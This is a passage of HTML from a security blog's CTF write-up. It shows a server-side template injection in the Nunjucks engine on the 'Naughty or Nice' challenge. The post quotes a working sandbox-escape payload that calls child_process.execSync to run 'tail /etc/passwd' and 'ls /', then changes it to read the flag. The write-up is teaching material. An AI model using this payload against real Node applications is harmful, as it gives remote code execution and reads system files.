						&lt;div class="card-page cart-page-bottom"&gt;
							&lt;p&gt;&lt;span class='nheader red'&gt;Naughty List&lt;/span&gt;
								</span><span class="p">${</span><span class="nx">NaughtyNames</span><span class="p">}</span><span class="s2">
							&lt;/p&gt;
						&lt;/div&gt;
					&lt;/div&gt;
					{% endblock %}
				`</span><span class="p">;</span>
				<span class="nx">resolve</span><span class="p">(</span><span class="nx">nunjucks</span><span class="p">.</span><span class="nx">renderString</span><span class="p">(</span><span class="nx">card</span><span class="p">));</span>
			<span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
				<span class="nx">reject</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
			<span class="p">}</span>
		<span class="p">})</span>
	<span class="p">}</span>
<span class="p">};</span>
</pre></table></code></div></div><h3 id="nunjucks-ssti-and-sandbox-escape"><span class="mr-2">Nunjucks SSTI and Sandbox Escape:</span><a href="#nunjucks-ssti-and-sandbox-escape" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Here, we see the code base is leveraging Nunjucks to help render the card. <a href="https://mozilla.github.io/nunjucks/">Nunjucks</a> is a templating engine specifically for JavaScript, which immediately makes me think this might be some sort of template injection vulnerability. We can do a quick test to confirm.</p><p>First, we edit one of the items to contain ``.</p><p><img data-src="/assets/img/img_non/test_payload.png" alt="7_7" data-proofer-ignore></p><p>Navigating back to the homepage, we see that the our `` payload renders as <code class="language-plaintext highlighter-rouge">49</code>, confirming that we have found a Server Side Template Injection!</p><p><img data-src="/assets/img/img_non/49.png" alt="49" data-proofer-ignore></p><p>If we continue to poke around on Google, we find some research has already been done on SSTI within Nunjucks. Nunjucks template code runs in a sandbox, so in order to get RCE we need to break out of that sandbox and access the underlying OS. If you are interested in how this sandbox escape works, checkout the pre-existing research that I used as a reference during this challenge - <a href="http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine">SANDBOX BREAKOUT - A VIEW OF THE NUNJUCKS TEMPLATE ENGINE</a>. From that article, we see the researchers obtained RCE with the following command:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{{</span><span class="nx">range</span><span class="p">.</span><span class="kd">constructor</span><span class="p">(</span><span class="dl">"</span><span class="s2">return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')</span><span class="dl">"</span><span class="p">)()}}</span>
</pre></table></code></div></div><p>Modifying this payload, we can obtain the flag!</p><h3 id="final-payload"><span class="mr-2">Final Payload:</span><a href="#final-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First, we run</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{{</span><span class="nx">range</span><span class="p">.</span><span class="kd">constructor</span><span class="p">(</span><span class="dl">"</span><span class="s2">return global.process.mainModule.require('child_process').execSync('ls /')</span><span class="dl">"</span><span class="p">)()}}</span>
</pre></table></code></div></div><p><img data-src="/assets/img/img_non/ls.png" alt="ls" data-proofer-ignore></p><p>We see the flag here, and we can change the payload to <code class="language-plaintext highlighter-rouge">cat</code> it out!</p><p><img data-src="/assets/img/img_non/see_flag.png" alt="see_flag" data-proofer-ignore> <img data-src="/assets/img/img_non/flag.png" alt="flag" data-proofer-ignore> <img data-src="/assets/img/img_non/flag_contents.png" alt="flag" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/web/'>Web</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/ssti/" class="post-tag no-text-decoration" >ssti</a> <a href="/tags/jwt/" class="post-tag no-text-decoration" >jwt</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=JWT+Confusion+and+SSTI+-+CyberSanta+CTF+Naughty+or+Nice+Web+Challenge+-+Stigward%27s+Security+Journal&url=https%3A%2F%2Fstigward.github.io%2Fposts%2Fnaughty-or-nice-web-chal%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=JWT+Confusion+and+SSTI+-+CyberSanta+CTF+Naughty+or+Nice+Web+Challenge+-+Stigward%27s+Security+Journal&u=https%3A%2F%2Fstigward.github.io%2Fposts%2Fnaughty-or-nice-web-chal%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fstigward.github.io%2Fposts%2Fnaughty-or-nice-web-chal%2F&text=JWT+Confusion+and+SSTI+-+CyberSanta+CTF+Naughty+or+Nice+Web+Challenge+-+Stigward%27s+Security+Journal" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/fiio-m6-exploit/">Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</a><li><a href="/posts/fiio-m6-kernel-bug/">Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</a><li><a href="/posts/swordmaster-pwn-chal/">UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/firmware/">firmware</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/iot/">iot</a> <a class="post-tag" href="/tags/jwt/">jwt</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/swordmaster-pwn-chal/"><div class="card-body"> <em class="small" data-ts="1664163180" data-df="ll" > Sep 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>UAF and House Of Force Fun - ROMHack CTF Swordmaster Pwn Challenge</h3><div class="text-muted small"><p> Swordmaster Pwn Challenge Overview: This challenge was part of the ROMHack CTF hosted on HackTheBox’s CTF platform. At the end of the 48 hour event, the challenge had roughly 10 solves. I was sadl...</p></div></div></a></div><div class="card"> <a href="/posts/fiio-m6-exploit/"><div class="card-body"> <em class="small" data-ts="1679974380" data-df="ll" > Mar 27, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Rooting the FiiO M6 - Part 2 - Writing an LPE Exploit For Our Overflow Bug</h3><div class="text-muted small"><p> Overview: A little over a month ago, I wrote a blog post detailing how I found a kernel vulnerability in the FiiO M6 Hi-Fi MP3 player. I would recommend reading that post first, but to recap: T...</p></div></div></a></div><div class="card"> <a href="/posts/fiio-m6-kernel-bug/"><div class="card-body"> <em class="small" data-ts="1676777580" data-df="ll" > Feb 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Rooting the FiiO M6 - Part 1 - Using the "World's Worst Fuzzer" To Find A Kernel Bug</h3><div class="text-muted small"><p> Overview: A few months ago, I was cleaning off my hardware workbench when I came across my FiiO M6, an Android-based “portable high-resolution lossless music player”. I originally purchased the dev...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></div><a href="/posts/wavlink-command-injection/" class="btn btn-outline-primary" prompt="Newer"><p>Wavlink Command Injection - CVE-2022-23900</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/_stigward">Stigward</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/research/">research</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/kernel/">kernel</a> <a class="post-tag" href="/tags/firmware/">firmware</a> <a class="post-tag" href="/tags/heap/">heap</a> <a class="post-tag" href="/tags/iot/">iot</a> <a class="post-tag" href="/tags/jwt/">jwt</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-QK87P1LVPH"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QK87P1LVPH'); }); </script>
